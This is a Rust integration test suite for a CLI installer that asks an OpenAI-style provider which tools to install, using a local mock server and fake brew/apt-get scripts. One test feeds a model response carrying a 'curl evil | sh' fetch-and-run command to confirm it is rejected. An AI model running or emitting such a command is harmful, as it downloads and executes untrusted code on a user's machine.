//! Integration and CLI boundary tests for the Ultimate Installer.
//!
//! Exercises:
//! - Real system context probing & state hashing
//! - CLI boundary flows with disposable fake package-manager binaries (dry run, approval,
//!   rejection, empty input, EOF, unsupported input, successful install, partial failure + retry,
//!   repeat run with nothing to install, Ubuntu sudo + apt-get + fdfind flow, missing prerequisites)
//! - OpenAI provider client against a local HTTP test double (auth header verification,
//!   structured output validation, error handling, secret redaction, and child env isolation)

use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

use ultimate_installer::auth::{self, ResolvedKey};
use ultimate_installer::context;
use ultimate_installer::openai::{OpenAiClient, ProviderDecision, ProviderError};

#[test]
fn context_probe_returns_valid_state() {
    let state = context::probe("integration_test".into());

    assert_eq!(state.intent, "integration_test");
    assert!(!state.os.is_empty(), "OS detection must return something");
    assert!(
        !state.arch.is_empty(),
        "arch detection must return something"
    );
    assert!(
        state.errors_encountered.is_empty(),
        "fresh state has no errors"
    );

    let fp = state.fingerprint();
    assert!(fp.contains("integration_test"));
}

#[test]
fn cold_start_detection_works() {
    let _has_keys = auth::has_any_api_key();
}

#[test]
fn hash_of_probed_state_is_deterministic() {
    let state = context::probe("hash_test".into());
    let h1 = ultimate_installer::hash::hash_state(&state);
    let h2 = ultimate_installer::hash::hash_state(&state);
    assert_eq!(h1, h2, "hash of probed state must be deterministic");
}

/// Spawn a minimal single-request HTTP/1.1 test double on loopback and return its URL and a
/// receiver for the captured raw HTTP request.
async fn spawn_mock_openai_server(
    status_line: &'static str,
    response_body: String,
) -> (String, tokio::sync::oneshot::Receiver<String>) {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let (tx, rx) = tokio::sync::oneshot::channel();

    tokio::spawn(async move {
        if let Ok((mut socket, _)) = listener.accept().await {
            let mut buf = vec![0u8; 16384];
            let mut raw = Vec::new();
            loop {
                match socket.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        raw.extend_from_slice(&buf[..n]);
                        let text = String::from_utf8_lossy(&raw);
                        if let Some(header_end) = text.find("\r\n\r\n") {
                            let headers = &text[..header_end];
                            let content_len = headers
                                .lines()
                                .find_map(|line| {
                                    let lower = line.to_ascii_lowercase();
                                    lower
                                        .strip_prefix("content-length:")
                                        .and_then(|v| v.trim().parse::<usize>().ok())
                                })
                                .unwrap_or(0);
                            let body_len = raw.len().saturating_sub(header_end + 4);
                            if body_len >= content_len {
                                break;
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx.send(String::from_utf8_lossy(&raw).to_string());

            let http_resp = format!(
                "HTTP/1.1 {status_line}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                response_body.len(),
                response_body
            );
            let _ = socket.write_all(http_resp.as_bytes()).await;
            let _ = socket.shutdown().await;
        }
    });

    (format!("http://{addr}/v1/chat/completions"), rx)
}

#[tokio::test]
async fn openai_client_sends_auth_header_and_validates_structured_output() {
    let fake_key = "sk-fake-provider-key-000111222";
    let body = serde_json::json!({
        "choices": [{
            "message": {
                "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\",\"fd\"],\"reason\":\"Text search and file finder\"}"
            }
        }]
    })
    .to_string();

    let (url, req_rx) = spawn_mock_openai_server("200 OK", body).await;

    let client = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.to_string(),
            source: "test".to_string(),
        },
        url,
        "gpt-4o-mini".to_string(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();

    let decision = client
        .resolve_intent("Set me up with ripgrep for searching text and fd for finding files")
        .await
        .unwrap();

    match decision {
        ProviderDecision::Install(tools) => {
            let ids: Vec<&str> = tools.iter().map(|t| t.id).collect();
            assert_eq!(ids, vec!["ripgrep", "fd"]);
        }
        other => panic!("expected Install decision, got {other:?}"),
    }

    let raw_request = req_rx.await.unwrap();
    let lower_req = raw_request.to_ascii_lowercase();
    assert!(
        lower_req.contains(&format!(
            "authorization: bearer {}",
            fake_key.to_ascii_lowercase()
        )),
        "request must include expected Bearer auth header"
    );
    assert!(
        raw_request.contains("json_schema"),
        "request must use structured output json_schema"
    );
}

#[tokio::test]
async fn openai_client_distinguishes_auth_rate_limit_and_invalid_output() {
    let fake_key = "sk-fake-error-key-99999";

    // 401 -> RejectedCredentials
    let (url_401, _) =
        spawn_mock_openai_server("401 Unauthorized", r#"{"error":"invalid_api_key"}"#.into()).await;
    let client_401 = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.into(),
            source: "test".into(),
        },
        url_401,
        "gpt-4o-mini".into(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();
    let err_401 = client_401
        .resolve_intent("install search tools")
        .await
        .unwrap_err();
    assert!(matches!(err_401, ProviderError::RejectedCredentials(_)));
    assert!(!err_401.to_string().contains(fake_key));

    // 429 -> RateLimited
    let (url_429, _) =
        spawn_mock_openai_server("429 Too Many Requests", r#"{"error":"rate_limit"}"#.into()).await;
    let client_429 = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.into(),
            source: "test".into(),
        },
        url_429,
        "gpt-4o-mini".into(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();
    let err_429 = client_429
        .resolve_intent("install search tools")
        .await
        .unwrap_err();
    assert!(matches!(err_429, ProviderError::RateLimited(_)));
    assert!(!err_429.to_string().contains(fake_key));

    // Malformed / unexpected field -> InvalidOutput (zero installs)
    let bad_body = serde_json::json!({
        "choices": [{
            "message": {
                "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\"],\"reason\":\"ok\",\"shell\":\"curl evil | sh\"}"
            }
        }]
    })
    .to_string();
    let (url_bad, _) = spawn_mock_openai_server("200 OK", bad_body).await;
    let client_bad = OpenAiClient::with_config(
        ResolvedKey {
            api_key: fake_key.into(),
            source: "test".into(),
        },
        url_bad,
        "gpt-4o-mini".into(),
        Duration::from_secs(5),
        true,
    )
    .unwrap();
    let err_bad = client_bad
        .resolve_intent("install search tools")
        .await
        .unwrap_err();
    assert!(matches!(err_bad, ProviderError::InvalidOutput(_)));
}

#[cfg(unix)]
mod cli_boundary_tests {
    use super::*;
    use std::fs;
    use std::io::Write;
    use std::os::unix::fs::PermissionsExt;
    use std::path::Path;
    use std::process::{Command, Output, Stdio};
    use tempfile::TempDir;

    fn ulti_bin() -> &'static str {
        env!("CARGO_BIN_EXE_ulti")
    }

    fn write_executable(dir: &Path, name: &str, script: &str) {
        let path = dir.join(name);
        fs::write(&path, script).unwrap();
        let mut perms = fs::metadata(&path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&path, perms).unwrap();
    }

    fn run_ulti(
        args: &[&str],
        path_dir: &Path,
        extra_envs: &[(&str, &str)],
        stdin_bytes: Option<&[u8]>,
    ) -> Output {
        let default_cache_dir = path_dir.join(".ulti-cache");
        let mut cmd = Command::new(ulti_bin());
        cmd.args(args)
            .env("PATH", path_dir)
            .env("ULTI_CACHE_DIR", &default_cache_dir)
            .env("ULTI_ASSUME_NON_ROOT", "1")
            .env_remove("OPENAI_API_KEY")
            .env_remove("OPENAI_BASE_URL")
            .env_remove("ULTI_ALLOW_INSECURE_LOCAL_PROVIDER")
            .env_remove("ULTI_OS_OVERRIDE")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());

        for (k, v) in extra_envs {
            cmd.env(k, v);
        }

        let mut child = cmd.spawn().unwrap();
        if let Some(bytes) = stdin_bytes {
            let mut stdin = child.stdin.take().unwrap();
            stdin.write_all(bytes).unwrap();
        } else {
            // Drop stdin immediately to simulate EOF
            drop(child.stdin.take());
        }
        child.wait_with_output().unwrap()
    }

    /// Create a fake `brew` binary that logs every invocation (and whether OPENAI_API_KEY leaked)
    /// and optionally creates fake `rg` / `fd` binaries in the same temp directory.
    fn install_fake_brew(bin_dir: &Path, log_file: &Path, env_log: &Path, mode: &str) {
        let script = format!(
            r#"#!/bin/sh
echo "brew $*" >> "{log}"
if [ -n "$OPENAI_API_KEY" ]; then
  echo "LEAKED:$OPENAI_API_KEY" >> "{env_log}"
else
  echo "CLEAN_ENV" >> "{env_log}"
fi

MODE="{mode}"
for arg in "$@"; do
  if [ "$arg" = "ripgrep" ]; then
    if [ "$MODE" = "success" ] || [ "$MODE" = "partial_rg_only" ]; then
      printf '#!/bin/sh\necho "ripgrep 14.1.0 (fake)"\n' > "{dir}/rg"
      /bin/chmod +x "{dir}/rg"
    fi
  elif [ "$arg" = "fd" ]; then
    if [ "$MODE" = "success" ]; then
      printf '#!/bin/sh\necho "fd 10.2.0 (fake)"\n' > "{dir}/fd"
      /bin/chmod +x "{dir}/fd"
    fi
  fi
done

if [ "$MODE" = "partial_rg_only" ]; then
  echo "Error: simulated failure installing fd" >&2
  exit 1
fi
exit 0
"#,
            log = log_file.display(),
            env_log = env_log.display(),
            dir = bin_dir.display(),
            mode = mode
        );
        write_executable(bin_dir, "brew", &script);
    }

    /// Create fake `sudo` and `apt-get` binaries for Ubuntu testing.
    fn install_fake_ubuntu_apt(bin_dir: &Path, log_file: &Path) {
        let sudo_script = format!(
            r#"#!/bin/sh
echo "sudo $*" >> "{log}"
exec "$@"
"#,
            log = log_file.display()
        );
        write_executable(bin_dir, "sudo", &sudo_script);

        let apt_script = format!(
            r#"#!/bin/sh
echo "apt-get $*" >> "{log}"
for arg in "$@"; do
  if [ "$arg" = "ripgrep" ]; then
    printf '#!/bin/sh\necho "ripgrep 14.1.0 (ubuntu-fake)"\n' > "{dir}/rg"
    /bin/chmod +x "{dir}/rg"
  elif [ "$arg" = "fd-find" ]; then
    printf '#!/bin/sh\necho "fdfind 9.0.0 (ubuntu-fake)"\n' > "{dir}/fdfind"
    /bin/chmod +x "{dir}/fdfind"
  fi
done
exit 0
"#,
            log = log_file.display(),
            dir = bin_dir.display()
        );
        write_executable(bin_dir, "apt-get", &apt_script);
    }

    #[test]
    fn cli_dry_run_previews_without_running_installer() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let out = run_ulti(
            &["install ripgrep and fd", "--dry-run"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );

        assert!(out.status.success());
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("brew install fd ripgrep"));
        assert!(stdout.contains("Dry run complete"));
        assert!(
            !log_file.exists(),
            "dry-run must not execute package manager"
        );
    }

    #[test]
    fn cli_rejection_empty_input_and_eof_stop_without_installing() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Explicit 'n'
        let out_n = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"n\n"),
        );
        assert!(!out_n.status.success());
        assert!(String::from_utf8_lossy(&out_n.stdout).contains("Installation cancelled"));

        // Empty input
        let out_empty = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"\n"),
        );
        assert!(!out_empty.status.success());

        // EOF
        let out_eof = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(!out_eof.status.success());

        assert!(
            !log_file.exists(),
            "rejected, empty, or EOF runs must never execute package manager"
        );
    }

    #[test]
    fn cli_unsupported_input_produces_zero_installs() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let out = run_ulti(
            &["install ripgrep and htop"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );

        assert!(!out.status.success());
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stderr.contains("Unsupported package(s): htop"));
        assert!(
            !log_file.exists(),
            "unsupported request must produce zero installs"
        );
    }

    #[test]
    fn cli_successful_install_and_repeat_run_with_nothing_to_install() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Run 1: approve install
        let out1 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(
            out1.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out1.stderr)
        );
        let stdout1 = String::from_utf8_lossy(&out1.stdout);
        assert!(stdout1.contains("ripgrep 14.1.0 (fake)"));
        assert!(stdout1.contains("fd 10.2.0 (fake)"));

        let logged = fs::read_to_string(&log_file).unwrap();
        assert_eq!(logged.trim(), "brew install fd ripgrep");

        // Run 2: repeat request with EOF stdin (must exit 0 without prompting or running brew)
        let out2 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(out2.status.success());
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("All requested tools are already installed"));
        assert!(stdout2.contains("Nothing to install"));

        let logged_after = fs::read_to_string(&log_file).unwrap();
        assert_eq!(
            logged_after.lines().count(),
            1,
            "repeat run must not invoke package manager again"
        );
    }

    #[test]
    fn cli_partial_failure_and_retry_installs_only_remaining_tool() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "partial_rg_only");

        // Run 1: partial failure (rg installs, fd fails)
        let out1 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(!out1.status.success());
        let stdout1 = String::from_utf8_lossy(&out1.stdout);
        let stderr1 = String::from_utf8_lossy(&out1.stderr);
        assert!(stdout1.contains("ripgrep 14.1.0 (fake)"));
        assert!(stderr1.contains("fd"));

        // Run 2: switch brew to succeed; retry should plan ONLY fd
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");
        let out2 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(out2.status.success());
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("Already installed:"));
        assert!(stdout2.contains("brew install fd"));
        assert!(stdout2.contains("fd 10.2.0 (fake)"));

        let lines: Vec<String> = fs::read_to_string(&log_file)
            .unwrap()
            .lines()
            .map(ToString::to_string)
            .collect();
        assert_eq!(lines, vec!["brew install fd ripgrep", "brew install fd"]);
    }

    #[test]
    fn cli_ubuntu_flow_uses_sudo_apt_get_fd_find_and_prints_fdfind_note() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("ubuntu.log");
        install_fake_ubuntu_apt(tmp.path(), &log_file);

        let out = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "ubuntu")],
            Some(b"y\n"),
        );
        assert!(
            out.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("sudo apt-get install -y fd-find ripgrep"));
        assert!(stdout.contains("fdfind"));
        assert!(stdout.contains("ripgrep 14.1.0 (ubuntu-fake)"));
        assert!(stdout.contains("fdfind 9.0.0 (ubuntu-fake)"));

        let logged = fs::read_to_string(&log_file).unwrap();
        assert!(logged.contains("sudo apt-get install -y fd-find ripgrep"));
        assert!(logged.contains("apt-get install -y fd-find ripgrep"));
    }

    #[test]
    fn cli_missing_prerequisite_and_windows_explain_requirements() {
        let tmp = TempDir::new().unwrap();

        let out_missing_brew = run_ulti(
            &["install ripgrep"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(!out_missing_brew.status.success());
        assert!(String::from_utf8_lossy(&out_missing_brew.stderr).contains("Homebrew"));

        let out_windows = run_ulti(
            &["install ripgrep"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "windows")],
            None,
        );
        assert!(!out_windows.status.success());
        let stderr_win = String::from_utf8_lossy(&out_windows.stderr);
        assert!(stderr_win.contains("Windows"));
        assert!(stderr_win.contains("macOS"));
        assert!(stderr_win.contains("Ubuntu"));
    }

    #[tokio::test]
    async fn cli_descriptive_request_uses_provider_redacts_key_and_strips_child_env() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let fake_key = "sk-cli-secret-must-never-leak-77777";
        let body = serde_json::json!({
            "choices": [{
                "message": {
                    "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\",\"fd\"],\"reason\":\"Matched catalog\"}"
                }
            }]
        })
        .to_string();

        let (url, req_rx) = spawn_mock_openai_server("200 OK", body).await;

        let path_buf = tmp.path().to_path_buf();
        let out = tokio::task::spawn_blocking(move || {
            run_ulti(
                &["Set me up with ripgrep for searching text and fd for finding files"],
                &path_buf,
                &[
                    ("ULTI_OS_OVERRIDE", "macos"),
                    ("OPENAI_API_KEY", fake_key),
                    ("OPENAI_BASE_URL", &url),
                    ("ULTI_ALLOW_INSECURE_LOCAL_PROVIDER", "1"),
                ],
                Some(b"y\n"),
            )
        })
        .await
        .unwrap();

        assert!(
            out.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out.stderr)
        );

        let stdout = String::from_utf8_lossy(&out.stdout);
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stdout.contains("brew install fd ripgrep"));
        assert!(stdout.contains("ripgrep 14.1.0 (fake)"));
        assert!(stdout.contains("fd 10.2.0 (fake)"));
        assert!(
            !stdout.contains(fake_key),
            "stdout must never contain API key"
        );
        assert!(
            !stderr.contains(fake_key),
            "stderr must never contain API key"
        );

        let env_report = fs::read_to_string(&env_log).unwrap();
        assert_eq!(
            env_report.trim(),
            "CLEAN_ENV",
            "child process must never receive OPENAI_API_KEY"
        );

        let raw_req = req_rx.await.unwrap();
        assert!(raw_req.to_ascii_lowercase().contains(&format!(
            "authorization: bearer {}",
            fake_key.to_ascii_lowercase()
        )));
    }

    #[test]
    fn cli_descriptive_request_without_key_reports_missing_key_and_does_nothing() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        let out = run_ulti(
            &["Set me up with ripgrep for searching text and fd for finding files"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );

        assert!(!out.status.success());
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stderr.contains("OPENAI_API_KEY"));
        assert!(!log_file.exists());
    }

    #[test]
    fn cli_aliases_and_reordered_tools_share_spec_and_label_previously_verified() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Run 1: install with "ripgrep and fd"
        let out1 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(out1.status.success());
        assert!(
            !String::from_utf8_lossy(&out1.stdout).contains("previously verified locally"),
            "first run must not claim prior verification"
        );

        // Remove installed fake binaries to simulate a fresh check on the same machine
        fs::remove_file(tmp.path().join("rg")).unwrap();
        fs::remove_file(tmp.path().join("fd")).unwrap();

        // Run 2: reordered aliases ("fd-find and rg") must hit the exact same spec & command
        let out2 = run_ulti(
            &["install fd-find and rg", "--dry-run"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(out2.status.success());
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("brew install fd ripgrep"));
        assert!(stdout2.contains("previously verified locally (succeeded 1 time(s))"));

        let db_path = tmp.path().join(".ulti-cache").join("cache.db");
        let conn = rusqlite::Connection::open(db_path).unwrap();
        let spec_count: i64 = conn
            .query_row("SELECT COUNT(*) FROM install_specs", [], |r| r.get(0))
            .unwrap();
        assert_eq!(spec_count, 1);
    }

    #[test]
    fn cli_full_and_partial_state_installs_share_spec_with_distinct_command_records() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Run 1: full install of both tools (brew install fd ripgrep)
        let out1 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(out1.status.success());

        // Remove only fd; rg remains installed
        fs::remove_file(tmp.path().join("fd")).unwrap();

        // Run 2: same request now plans only `brew install fd` (distinct command for same spec)
        let out2 = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(out2.status.success());
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("brew install fd"));
        assert!(
            !stdout2.contains("previously verified locally"),
            "distinct command must not be labeled previously verified before running"
        );

        let db_path = tmp.path().join(".ulti-cache").join("cache.db");
        let conn = rusqlite::Connection::open(db_path).unwrap();
        let spec_count: i64 = conn
            .query_row("SELECT COUNT(*) FROM install_specs", [], |r| r.get(0))
            .unwrap();
        let cmd_count: i64 = conn
            .query_row("SELECT COUNT(*) FROM verified_commands", [], |r| r.get(0))
            .unwrap();
        assert_eq!(spec_count, 1, "both runs share one canonical install spec");
        assert_eq!(
            cmd_count, 2,
            "full install and partial-state install retain separate command records"
        );
    }

    #[test]
    fn cli_non_success_outcomes_never_create_or_increment_cache() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "partial_rg_only");

        // Dry run, cancel, and partial failure must create zero records
        let _ = run_ulti(
            &["install ripgrep and fd", "--dry-run"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        let _ = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"n\n"),
        );
        let out_partial = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(!out_partial.status.success());

        let db_path = tmp.path().join(".ulti-cache").join("cache.db");
        let conn = rusqlite::Connection::open(&db_path).unwrap();
        let cmd_count: i64 = conn
            .query_row("SELECT COUNT(*) FROM verified_commands", [], |r| r.get(0))
            .unwrap();
        assert_eq!(cmd_count, 0, "non-success outcomes must write zero records");

        // Now remove rg, switch brew to success, and complete one verified install
        fs::remove_file(tmp.path().join("rg")).unwrap();
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");
        let out_ok = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            Some(b"y\n"),
        );
        assert!(out_ok.status.success());

        // Repeat no-op run must exit 0 and NOT increment success_count
        let out_noop = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[("ULTI_OS_OVERRIDE", "macos")],
            None,
        );
        assert!(out_noop.status.success());
        assert!(String::from_utf8_lossy(&out_noop.stdout).contains("Nothing to install"));

        let success_count: i64 = conn
            .query_row(
                "SELECT success_count FROM verified_commands LIMIT 1",
                [],
                |r| r.get(0),
            )
            .unwrap();
        assert_eq!(
            success_count, 1,
            "no-op repeat run must not increment count"
        );
    }

    #[tokio::test]
    async fn cli_descriptive_request_cache_hit_works_without_key_and_zero_provider_calls() {
        use std::sync::Arc;
        use std::sync::atomic::{AtomicUsize, Ordering};

        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Counting mock OpenAI server that handles multiple connections if called
        let request_counter = Arc::new(AtomicUsize::new(0));
        let counter_clone = Arc::clone(&request_counter);
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let url = format!("http://{addr}/v1/chat/completions");

        let body = serde_json::json!({
            "choices": [{
                "message": {
                    "content": "{\"intent\":\"install\",\"tools\":[\"ripgrep\",\"fd\"],\"reason\":\"Matched catalog\"}"
                }
            }]
        })
        .to_string();

        let server_task = tokio::spawn(async move {
            loop {
                let Ok((mut socket, _)) = listener.accept().await else {
                    break;
                };
                counter_clone.fetch_add(1, Ordering::SeqCst);
                let mut buf = vec![0u8; 8192];
                let _ = socket.read(&mut buf).await;
                let http_resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = socket.write_all(http_resp.as_bytes()).await;
                let _ = socket.shutdown().await;
            }
        });

        let prompt = "Set me up with ripgrep for searching text and fd for finding files";
        let path_buf = tmp.path().to_path_buf();

        // Process 1: resolves through mock provider (count becomes 1) and persists to SQLite
        let path1 = path_buf.clone();
        let url1 = url.clone();
        let out1 = tokio::task::spawn_blocking(move || {
            run_ulti(
                &[prompt],
                &path1,
                &[
                    ("ULTI_OS_OVERRIDE", "macos"),
                    ("OPENAI_API_KEY", "sk-fake-descriptive-cache-key"),
                    ("OPENAI_BASE_URL", &url1),
                    ("ULTI_ALLOW_INSECURE_LOCAL_PROVIDER", "1"),
                ],
                Some(b"y\n"),
            )
        })
        .await
        .unwrap();
        assert!(
            out1.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out1.stderr)
        );
        assert_eq!(request_counter.load(Ordering::SeqCst), 1);

        // Remove binaries so Process 2 builds a real install plan + preview
        fs::remove_file(tmp.path().join("rg")).unwrap();
        fs::remove_file(tmp.path().join("fd")).unwrap();

        // Process 2: brand new process with OPENAI_API_KEY UNSET — must succeed with ZERO provider calls
        let path2 = path_buf.clone();
        let out2 = tokio::task::spawn_blocking(move || {
            run_ulti(
                &[prompt],
                &path2,
                &[("ULTI_OS_OVERRIDE", "macos")],
                Some(b"y\n"),
            )
        })
        .await
        .unwrap();
        assert!(
            out2.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out2.stderr)
        );
        let stdout2 = String::from_utf8_lossy(&out2.stdout);
        assert!(stdout2.contains("brew install fd ripgrep"));
        assert!(stdout2.contains("previously verified locally (succeeded 1 time(s))"));
        assert_eq!(
            request_counter.load(Ordering::SeqCst),
            1,
            "cached descriptive request must make zero provider calls"
        );

        // Process 3: tools now installed, OPENAI_API_KEY UNSET -> no-op exit 0, still zero provider calls
        let path3 = path_buf.clone();
        let out3 = tokio::task::spawn_blocking(move || {
            run_ulti(&[prompt], &path3, &[("ULTI_OS_OVERRIDE", "macos")], None)
        })
        .await
        .unwrap();
        assert!(out3.status.success());
        assert!(String::from_utf8_lossy(&out3.stdout).contains("Nothing to install"));
        assert_eq!(request_counter.load(Ordering::SeqCst), 1);

        server_task.abort();
    }

    #[test]
    fn cli_unavailable_cache_degrades_gracefully_and_reports_save_failure() {
        let tmp = TempDir::new().unwrap();
        let log_file = tmp.path().join("cmd.log");
        let env_log = tmp.path().join("env.log");
        install_fake_brew(tmp.path(), &log_file, &env_log, "success");

        // Point ULTI_CACHE_DIR at a regular file so SQLite open fails
        let blocker = tmp.path().join("not-a-directory");
        fs::write(&blocker, "blocked").unwrap();

        let out = run_ulti(
            &["install ripgrep and fd"],
            tmp.path(),
            &[
                ("ULTI_OS_OVERRIDE", "macos"),
                ("ULTI_CACHE_DIR", blocker.to_str().unwrap()),
            ],
            Some(b"y\n"),
        );

        assert!(
            out.status.success(),
            "install must still succeed when cache is unavailable"
        );
        let stdout = String::from_utf8_lossy(&out.stdout);
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(stdout.contains("ripgrep 14.1.0 (fake)"));
        assert!(stdout.contains("fd 10.2.0 (fake)"));
        assert!(stderr.contains("local verification history could not be saved"));
    }
}
